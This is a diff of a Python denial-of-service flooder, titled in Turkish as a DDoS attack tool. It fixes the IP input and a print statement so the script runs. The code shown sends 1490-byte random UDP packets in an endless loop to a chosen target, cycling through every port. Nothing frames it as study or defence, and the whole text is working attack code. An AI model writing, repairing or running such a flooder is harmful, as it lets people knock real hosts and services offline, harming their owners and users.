@@ -21,7 +21,7 @@ baytlar = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Saldiri Araci")
 print 
-ip = int(input("IP Hedefi : "))
+ip = (input("IP Hedefi : "))
 port = int(input("Port numarasını girin: "))
 
 os.system("clear")
@@ -41,6 +41,6 @@ while True:
   soket.sendto(baytlar, (ip,port))
   gönderilen = gönderilen + 1
   port = int(port) + 1
-  print("%s IP adresine ve %s nolu porta %s paket gönderildi.")%(ip,port,gönderilen)
+  print("%s IP adresine ve %s nolu porta %s paket gönderildi." % (ip, port, gönderilen))
   if port == 65535:
     port = 1
